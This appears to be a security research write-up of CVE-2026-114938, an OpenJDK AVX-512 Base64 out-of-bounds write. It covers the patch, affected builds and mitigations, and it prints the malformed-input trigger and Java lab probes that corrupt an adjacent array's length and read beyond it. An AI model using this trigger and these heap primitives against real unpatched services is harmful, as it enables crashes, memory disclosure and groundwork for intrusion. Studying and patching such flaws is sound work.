---
title: "Java4Shell: four lines in the patch, and how far the bug actually goes"
description: "Reconstructing the four-line OpenJDK fix for CVE-2026-114938, reproducing the out-of-bounds write under Intel SDE, and measuring how far the primitive goes."
pubDate: 2026-11-17
pubTime: "22:01"
tags: ["security", "java", "openjdk", "cve", "exploitability"]
draft: false
image: "/assets/images/post-java4shell.jpg"
---

CVE-2026-114938 is an out-of-bounds write in OpenJDK's AVX-512 Base64 decoder. The fix is four lines. We rebuilt the diff from the upstream tags, reproduced the write on an x86 host that doesn't have AVX-512 by emulating it with Intel SDE, corrupted a live array's length, and read past the array through the corrupted length. We did not build a code-execution chain. The public research stops short of that, and so did we.

Calif disclosed the bug on November 17, 2026, the same day Oracle shipped the fix. CVSS 4.0 score: 9.2.

The short version:

- Affected: JDK 17.0.6 through 17.0.21, plus 21/25/27 before their `.1` fixes. The code landed in JDK 18 and was backported to 17.0.6, so 17.0.0–17.0.5, 16, 11 and 8 are clean.
- It needs x86-64 with AVX-512 VBMI. Not ARM. Not older Xeons or pre-Zen 4 AMD.
- The trigger is 129 bytes on JDK 17 (`128 * "A" + "="`) or 65 bytes on branches where the stub's break-even is 64.
- A crash is cheap once the heap lines up. Code execution is a per-target research project.

## The patch is four lines

`8393212: Base64 optimization improvements` adds this to `src/hotspot/cpu/x86/stubGenerator_x86_64.cpp`, at the top of the handler for the final 1–63 bytes:

```c
// A padded Base64 tail shorter than one complete block is handled by Java.
__ cmpl(length, 4);
__ jcc(Assembler::less, L_bruteForce);
```

That's it. Author Anton Voznia, backport of `e56f69c725f8b3f26366ed78e522faf1d35105d0`. Fixed builds are 17.0.21.1, 21.0.13.1, 25.0.5.1 and 27.0.1.1.

The guard sends tails shorter than one 4-byte group to the scalar decoder. `L_bruteForce` shifts the remaining length right by two, gets zero chunks, and returns. Java then handles the rest and throws for the invalid padding. Tails of 4–63 bytes still use the vector path, and that's safe: `output_size` is at least 3 there, at most two padding bytes are subtracted, and the mask stays correct.

Finding the patch was straightforward once the advisory named the subsystem. The security commit subjects are scrubbed to bland names ("Base64 optimization improvements", "Enhance vector masks", "Improve TLS client connections"), so you diff the release tags, look for the commit that touches the Base64 intrinsic, and read the code against the disclosed root cause.

We compared `jdk-17.0.21+4` with `jdk-17.0.21.1-ga`. Twenty-one commits in that range: CA certs, tzdata, FreeType and libpng bumps, plus a batch of scrubbed security fixes. One commit, four lines, matches the vulnerability.

You don't need a full clone to do this. The compare API gives you the commit list, and raw.githubusercontent.com gives you the file at each tag:

```sh
curl -s "https://api.github.com/repos/openjdk/jdk17u/compare/jdk-17.0.21-ga...jdk-17.0.21.1-ga" \
  | jq -r '.commits[].commit.message' | head -30
```

Trimmed to the commits that aren't certificate or timezone housekeeping:

```text
8ea73158afc9 8393212: Base64 optimization improvements
3e44663ee7ab 8393456: Improve TLS client connections
6a15917d8b4c 8390694: Enhance vector masks
0d690409b008 8389989: Enhance loop handling
709bfb12aadc 8387541: Enhance StringBuilder checks
ba3fa5220ba3 8387162: Enhance Kerberos tickets
5d233c30a61e 8391595: [REDO] Enhance JMX Connections
6d83ddc40e0e 8389830: Enhance JFR Events
```

None of those subjects contains a CVE or describes the bug. The Base64 one is the commit that touches `stubGenerator_x86_64.cpp`; the others land in TLS, the vector API, loop opts, `AbstractStringBuilder`, Kerberos, JMX and JFR.

## What the bug does

`Base64.Decoder` calls `decodeBlock`, which C2 can replace with a stub. On a CPU with AVX-512 VBMI, that stub has a fast path that processes 256-byte and 64-byte blocks, then a handler for the last 1–63 bytes.

For `"A" * 128 + "="`, `decodedOutLength` returns 98, so the output array is 98 bytes. The stub decodes the first 128 characters as two 64-byte blocks, 96 bytes in total. One byte is left: the stray `=`.

The tail handler computes `output_size = (length / 4) * 3`. With one byte left, that's zero. Then it strips the padding and decrements `output_size` for the trailing `=`, with no check that the result is still non-negative. It becomes `-1`. The code builds the store mask with `BZHI`:

```c
__ movq(output_mask, -1);
__ bzhiq(output_mask, output_mask, output_size);
```

`BZHI` reads the count from the low byte. `-1` is `0xFF`, which is greater than the 64-bit operand width, so the instruction leaves all 64 bits set. The padding byte was also shifted out of the input mask, so the vector register is filled with the `'a'` filler and the "invalid base64 character" check passes. The masked store then runs with a full mask:

```c
__ evmovdqub(Address(dest, dp), k1, tmp, true, Assembler::AVX_512bit);
```

The store lands at offset 96 and covers 96–159. The array ends at 98. That's 62 bytes past the end of a live Java array. The decoder still throws `IllegalArgumentException` afterwards. Catching the exception doesn't undo the write.

Most of the spilled bytes are the repeating `69 9a a6` filler; the last 16 are `0x9a`. Roughly one and a half bytes are attacker-chosen. That matters later: you don't get a free-form 64-byte write, you get a fixed-value spill with a controllable offset.

One detail that cost us time: on JDK 17 the stub only enters the AVX-512 path when the remaining length is greater than 128. That's why the 17 trigger is 129 bytes, not 65. On branches where the break-even is 64, the 65-byte version works and the output array is 50 bytes.

## Which JDKs are affected

The vulnerable code is one HotSpot optimization, not a language feature. It was integrated on mainline in JDK 18 as `JDK-8268276: Base64 Decoding optimization for x86 using AVX-512` and backported into 17.0.6. You can check a source tree by grepping the stub for `evpermt2b`:

| Source | AVX-512 Base64 decode | Affected |
|---|---|---|
| `jdk8u/master` | none; `Base64` has no decode intrinsic at all | no |
| `jdk11u/master` | none; encode stub only | no |
| `jdk-16+36` | none | no |
| `jdk-17+35` (17 GA) | none | no |
| `jdk-17.0.6+10` | present | yes |
| `jdk-18+36` through 20 | present | yes, but out of support and no fixed build |
| `jdk21u`, `jdk25u`, `jdk/master` | present | yes |

So "Java 17 and everything above" is the wrong model. 17.0.0–17.0.5 are clean. 21/25/27 are affected because they come from the 18+ mainline, not because of the version number. Java 8 and 11 are separate, older code lines that never got the backport. That's why you didn't see Java 11 in the advisory.

Oracle lists `8u511b33-perf` as vulnerable. 8u's source doesn't have the decode intrinsic, so that conflicts with the code history. Treat that build as unresolved until someone explains it.

Any vendor build that backported `8268276` into an older line is affected even if the version string looks safe. Check the stub, not the number.

## When it's exploitable

All of these have to be true:

1. The runtime contains the intrinsic: 17.0.6+, 18–20, or 21/25/27 before the fixed builds.
2. The host is x86-64 with AVX-512 VBMI, plus AVX512F, AVX512BW and BMI2. Ice Lake, Sapphire Rapids, Emerald Rapids, Granite Rapids; AMD Zen 4 or newer.
3. The JVM hasn't disabled the path. `-XX:-UseBASE64Intrinsics` or `-XX:UseAVX=2` removes it. `UseAVX=2` is x86-only; ARM JVMs reject the flag and fail to start.
4. Attacker-controlled bytes reach `Base64.getDecoder()` or `getUrlDecoder()`. The MIME decoder returned by `getMimeDecoder()` bypasses the intrinsic.
5. `Base64$Decoder.decodeBlock` has been JIT-compiled. The stub is a C2 intrinsic; the interpreter never runs it. A cold service that decodes once per connection may stay safe in practice even on affected hardware.
6. The malformed tail is a padding-only fragment of 1–3 bytes after whole blocks.

Condition 5 is easy to miss when you're testing. It's also why the lab harness has to warm the decoder before it does anything.

For code execution you need more: control over heap layout, a response path that returns the corrupted object's contents, and a request stream you can time. Those are the parts the public write-up describes in general terms and doesn't hand over.

## How hard is it, really

Split the impact. The answers are different.

**Denial of service.** One malformed decode per attempt. If the write lands on a live object header, the JVM usually dies at the next GC or the next use of that object. No grooming, no feedback channel, no per-target payload. Cheap to try.

**Remote code execution.** Low to moderate per target, and not mass-exploitable today. The trigger is public, the RCE chains are not. The discoverer says there is no universal exploit and each application needs its own profile. They demonstrated pre-auth RCE against Keycloak, Jira, Confluence, Artifactory, Jenkins and PingFederate in default configurations, and post-auth RCE against Kafka, Solr, Elasticsearch, Gerrit and Spinnaker. Those chains involved heap grooming, a writer and reader primitive in the app, and application-specific actions.

**Is it configuration dependent?** Yes, but not in the "feature flag" sense. On affected hardware, the default configuration is vulnerable. The knobs that matter are the CPU instruction set, the two JVM flags, which decoder API the app calls, whether the decode path is hot, and whether a proxy buffers request bodies. `nginx` buffers request bodies by default, which breaks some streaming-based grooming, but it isn't a general mitigation: single-request chains and WebSocket tunnels get around it.

**How complicated is the exploit?** The trigger is trivial. The RCE is not. You get a fixed-value spill of 62 bytes. The published chain turns it into an array-length overwrite, uses that as a writer, corrupts a second array whose contents come back in a response, leaks heap memory, repairs the damaged headers, and then escalates to an arbitrary write that reaches the code cache. Each step depends on G1 region alignment, TLAB behaviour and object sizes. That's a research project per application shape without the withheld chains.

**Can it be repeated?** DoS, yes. RCE, it depends on the attempt. The write either lands on something useful or it doesn't. The discoverer describes spraying several writer/reader pairs, discarding misses and retrying, and renting a VM in the target's region to keep round-trip times stable. A bad placement can crash the JVM; if the service restarts, you try again. It's not a coin flip per packet, but it's not deterministic either.

## Testing it without AVX-512 hardware

The test host is a Xeon E5-2650 v3. That's Haswell: no AVX-512 at all, so a VM with `-cpu host` can't expose VBMI either. We used Intel SDE 10.13.1 with `-icx`, which emulates the Ice Lake CPUID and the AVX-512 VBMI instructions. The JVM runs normally, sees VBMI, and takes the vulnerable path. SDE is slow, but it executes the real HotSpot code.

The lab is a small Docker setup. The vulnerable image is the vendor JDK plus a handful of classes:

```dockerfile
ARG JDK_IMAGE=eclipse-temurin:17.0.21_9-jdk
FROM ${JDK_IMAGE}

WORKDIR /app
COPY src/ /src/
RUN javac -d /app /src/*.java

COPY entrypoint.sh /usr/local/bin/entrypoint
RUN chmod 755 /usr/local/bin/entrypoint

EXPOSE 8080
ENTRYPOINT ["/usr/local/bin/entrypoint"]
CMD ["canary"]
```

Build it, then run the canary or the flag control:

```sh
docker build --build-arg JDK_IMAGE=eclipse-temurin:17.0.21_9-jdk \
  -t java4shell-lab:vuln .
docker run --rm java4shell-lab:vuln canary
docker run --rm -e JAVA_OPTS=-XX:-UseBASE64Intrinsics \
  java4shell-lab:vuln canary
```

The fixed image pulls the Zulu 17.0.21.1 tarball instead, because Adoptium hadn't published a `17.0.21.1` tag when we checked. Same compile step, different base:

```dockerfile
FROM --platform=linux/amd64 debian:bookworm-slim
ARG JDK_URL=https://cdn.azul.com/zulu/bin/zulu17.70.201-ca-jdk17.0.21.1-linux_x64.tar.gz
RUN apt-get update \
 && apt-get install -y --no-install-recommends curl ca-certificates \
 && mkdir -p /opt/jdk \
 && curl -fsSL "$JDK_URL" | tar xz -C /opt/jdk --strip-components=1
ENV PATH=/opt/jdk/bin:$PATH
```

### The app

The service is deliberately simple. Every request to `/api/login` decodes the Basic credentials before it checks them, which is the pre-auth shape the advisory describes:

```java
private static void login(HttpExchange ex) throws IOException {
    String auth = ex.getRequestHeaders().getFirst("Authorization");
    if (auth == null || !auth.startsWith("Basic ")) {
        respond(ex, 401, "missing basic auth");
        return;
    }
    byte[] decoded;
    try {
        decoded = Base64.getDecoder().decode(auth.substring("Basic ".length()));
    } catch (IllegalArgumentException e) {
        respond(ex, 400, "bad base64");
        return;
    }
    String user = new String(decoded, StandardCharsets.ISO_8859_1).split(":", 2)[0];
    respond(ex, 200, "user=" + user);
}
```

### The canary

This one is bounded on purpose. It decodes into a 4096-byte array we allocate, so the 62-byte spill stays inside a live Java array. Nothing outside the array is touched, which makes it safe to run in CI.

```java
byte[] warm = "A".repeat(256).getBytes(StandardCharsets.US_ASCII);
byte[] malformed = ("A".repeat(128) + "=").getBytes(StandardCharsets.US_ASCII);
byte[] target = new byte[4096];
int alloc = ((128 + 1 + 3) / 4) * 3 - 1;      // 98
int oob = 0;

for (int i = 0; i < 100_000; i++) {
    sink += decoder.decode(warm, target);      // warm C2 into the intrinsic
}
Arrays.fill(target, (byte) 0x5a);
try {
    decoder.decode(malformed, target);
} catch (IllegalArgumentException expected) {
    // the write already happened
}
for (int i = alloc; i < alloc + 62; i++) {
    if (target[i] != (byte) 0x5a) oob++;
}
```

### The length-corruption probe

Here we stop protecting the write. The destination is exactly `decodedOutLength` bytes, and the victim is allocated right after it in the same TLAB:

```java
byte[] malformed = ("A".repeat(128) + "=").getBytes(StandardCharsets.US_ASCII);
byte[] dst = new byte[98];        // 16-byte header, 114 rounded to 120
byte[] victim = new byte[256];    // starts at dst + 120
Arrays.fill(victim, (byte) 0x41);
keep = victim;                    // escape, so the allocation isn't eliminated

try {
    decoder.decode(malformed, dst);
} catch (IllegalArgumentException expected) { }

long offset = (long) unsafe.arrayBaseOffset(byte[].class) - 4;
int len = unsafe.getInt(keep, offset);   // 0x9aa6699a
```

The store starts at `dst` data + 96, which is object offset 112. The victim starts at 120, so the first 56 bytes of the victim get the fixed pattern: mark word, klass pointer, length, and part of its data.

### The reader

The second probe changes the tail and inserts a zero-length array as a spacer, which shifts the victim so the length field lands on a different byte of the pattern:

```java
byte[] malformed = ("A".repeat(128) + "A==").getBytes(StandardCharsets.US_ASCII);
byte[] dst = new byte[97];
byte[] spacer = new byte[0];      // 16-byte object, shifts the victim by 16
fillerKeep = spacer;              // escape, so it isn't optimized away
byte[] victim = new byte[256];

try { decoder.decode(malformed, dst); } catch (IllegalArgumentException e) { }

int len = readLen();              // victim.length, 0x699aa669
int b = readByte(300);            // 44 bytes past the victim's data
```

`readLen` and `readByte` are trivial, but we run them with `-XX:CompileCommand=exclude` so the JIT can't fold the original 256 or drop the bounds check:

```java
private static int readLen() { return keep.length; }
private static int readByte(int i) { return keep[i] & 0xff; }
```

The run flags:

```sh
java -Xms1g -Xmx1g -XX:-TieredCompilation -XX:CompileThreshold=1000 \
  -XX:CompileCommand=exclude,ReaderProbe::readLen \
  -XX:CompileCommand=exclude,ReaderProbe::readByte \
  -cp out ReaderProbe
```

### Running it under SDE

On the Haswell host we prefix the same commands with `sde64 -icx` and bypass the CPU check, since `/proc/cpuinfo` still shows the host CPU:

```sh
LAB_FORCE=1 sde64 -icx -- java -Xms1g -Xmx1g \
  -XX:-TieredCompilation -XX:CompileThreshold=1000 \
  -cp out Base64Canary
```

One testing detail caused a false result. The first malformed decode deoptimizes the compiled `decode0`: the Java slow path that handles the leftover padding has never been taken during warm-up, so C2 has it behind an uncommon trap. After the deopt, a second probe in the same JVM runs interpreted, doesn't use the intrinsic, and reports clean. Our first multi-probe harness did exactly that. The canary now runs one probe per JVM. If you build your own, do the same.

## What we proved

Eight cases, all under SDE on the Haswell host:

| Probe | 17.0.21 | 17.0.21.1 |
|---|---|---|
| Bounded canary | 62 bytes OOB | 0 |
| Bounded canary, `-XX:-UseBASE64Intrinsics` | 0 | — |
| Bounded canary, `-XX:UseAVX=2` | 0 | — |
| Live-neighbour probe | `victim.length = 0x9aa6699a` | `256` |
| Reader probe | `victim.length = 0x699aa669`, `victim[300]` read | `256`, read skipped |

The first row is the memory-safety violation. The last two are the interesting ones. The two flag rows were only run against the vulnerable build.

The probe output, trimmed:

```text
canary 17.0.21        prefix=128 input_len=129 alloc=98 spill_span=62 rejected=true oob=62
canary -NoBase64Intr  prefix=128 input_len=129 alloc=98 spill_span=62 rejected=true oob=0
canary -UseAVX=2      prefix=128 input_len=129 alloc=98 spill_span=62 rejected=true oob=0
canary 17.0.21.1      prefix=128 input_len=129 alloc=98 spill_span=62 rejected=true oob=0
heap 17.0.21          victim.length=-1700370022 hex=0x9aa6699a
heap 17.0.21.1        victim.length=256 hex=0x100
reader 17.0.21        victim.length=1771742825 hex=0x699aa669 victim[300]=47
reader 17.0.21.1      victim.length=256 hex=0x100
```

**Length corruption.** Allocate a destination array of exactly `decodedOutLength` bytes, then allocate the victim right after it in the same TLAB. The store starts two bytes before the destination ends, so it overwrites the victim's mark word, klass pointer and length field. Reading the length field with `Unsafe` gives `0x9aa6699a`, which is negative. The corruption comes from the decoder; `Unsafe` only reads the result. The klass pointer is damaged too: a normal cast dies in `SharedRuntime::generate_class_cast_message(Klass*, Klass*, Symbol*)+0x59`. That's a real constraint on any exploit. You can't just corrupt a header and keep running; you have to repair what you broke. A normal cast on the damaged victim produced this:

```text
SIGSEGV (0xb)
Problematic frame:
V  [libjvm.so+0xce95b9]  SharedRuntime::generate_class_cast_message(Klass*, Klass*, Symbol*)+0x59
```

**Disclosure.** Use the `A==` tail and put a 16-byte zero-length array between the destination and the victim. That shifts the victim so the overwritten length lands on the `0x69` byte of the pattern and becomes a large positive number, `0x699aa669`. A normal `byte[]` bounds check now passes, and `victim[300]` reads 44 bytes past the end of the victim's data. The probe is pure Java: no `Unsafe` involved in the corruption or the read. The length and element accesses run in JIT-excluded methods so the compiler can't fold the original length or remove the check.

On 17.0.21.1 both probes report 256 and the read is skipped. Same input, same emulation, only the build changes the result.

This is the part that makes the difficulty concrete. With allocation adjacency under control, the length corruption and the out-of-bounds read are deterministic. The hard part isn't the primitive. It's getting the primitive in a remote process where you don't choose the allocation order.

## What's left before RCE

1. **Remote adjacency.** In the lab we allocate `dst`, the spacer and the victim in a known order. Remotely, the destination is allocated inside `decode`, and the bytes after it are TLAB slack. You need the write to cross a G1 region boundary into a live object. That's spray-and-pray with region alignment, TLAB exit behaviour and network timing.
2. **Survival.** The mark word and klass pointer take damage along with the length. You need the originals to repair them, or the JVM dies. Our live-neighbour probe showed exactly where.
3. **Feedback.** The application has to return the corrupted array's contents, or you can't turn the read into a leak.
4. **Arbitrary write.** Widen the writer into a chosen-value linear write, then reach the code cache or JVM hooks.
5. **Per-target work.** Every application has a different decoder route, heap profile and response shape. There is no universal payload.

Our ranking, with the measured evidence behind it:

```
crash  <  length corruption  <  disclosure  <  arbitrary write  <  RCE
```

Crash needs the least from the heap. Length corruption and disclosure are deterministic when you control adjacency, and the harness for each is short. Arbitrary write and code execution are the parts that need the remote grooming, the repair path and the per-target work.

We stopped at disclosure on purpose. Building the rest would turn this into a weaponised chain, not an exploitability assessment.

## If you run Java

- Update to 17.0.21.1, 21.0.13.1, 25.0.5.1 or 27.0.1.1. Restart the process. Check bundled JVMs and container base images; rebuilding the application image isn't enough if the runtime comes from a base layer you didn't update.
- If you can't update, `-XX:-UseBASE64Intrinsics` is the narrower workaround. `-XX:UseAVX=2` also works but disables all AVX-512 use. Don't put that flag in a shared config applied to ARM hosts; those JVMs won't start.
- Check whether the host has VBMI before you panic:

  ```sh
  grep -m1 -oE 'avx512_?vbmi' /proc/cpuinfo
  ```

  No output means the bug can't run there. Cloud instance families that do have it include AWS C6i/M6i/R6i and C7i/M7i/R7a, GCP C3/C3D/C4/C4D/N4/N4D/M3/M4, and Azure Dsv5/Dsv6/Dasv6/Dasv7.
- Confirm the runtime and flags on the running process, not on whatever `java` is first in your shell's PATH:

  ```sh
  jcmd <pid> VM.version
  jcmd <pid> VM.flags -all
  ```

- An application-level filter that rejects inputs whose final group is padding-only is a stopgap, not a fix. It only helps on the routes you remembered to cover.
- The MIME decoder isn't a mitigation you can lean on. It happens to skip the intrinsic, but most applications use the basic or URL decoder.

## Reproduce it

The lab lives in `java4shell/lab/`:

```sh
# on x86-64, with Docker
./run-matrix.sh local

# fixed-build comparison
FIXED_DOCKERFILE=Dockerfile.fixed ./run-matrix.sh all

# no AVX-512 hardware: emulate Ice Lake with Intel SDE
./verify-sde.sh
```

`verify-sde.sh` downloads Temurin 17.0.21, Zulu 17.0.21.1 and SDE into a work directory, then runs the canary and both primitive probes against each build. Eight cases, pass/fail output.

## What we didn't prove

We didn't get code execution, and we didn't try to. We also didn't test native AVX-512 hardware; SDE emulates the instruction set, so the code paths are real but the performance numbers aren't. The remote grooming problem is unsolved in our lab. And the Oracle 8u build question is still open.

What's solid: the four-line patch, the 17.0.6 backport boundary, and a heap primitive that a patched build stops.

## Sources

- Calif, "Java4Shell: Write once, RCE everywhere": https://calif.io/java4shell/
- Red Hat, RHSB-2026-018: https://access.redhat.com/security/vulnerabilities/RHSB-2026-018
- Datadog Security Labs: https://securitylabs.datadoghq.com/articles/java4shell-remote-code-execution-in-openjdk-cve-2026-114938/
- JFrog Security Research: https://research.jfrog.com/post/java4shell-vulnerability/
- OpenJDK advisory, 2026-11-17: https://openjdk.org/groups/vulnerability/advisories/2026-11-17
- Oracle Critical Patch Update, November 2026: https://www.oracle.com/security-alerts/cspunov2026.html
- Upstream fix, `8393212`: https://github.com/openjdk/jdk17u/commit/8ea73158afc9
- `JDK-8268276`, the optimization that introduced the code: https://bugs.openjdk.org/browse/JDK-8268276
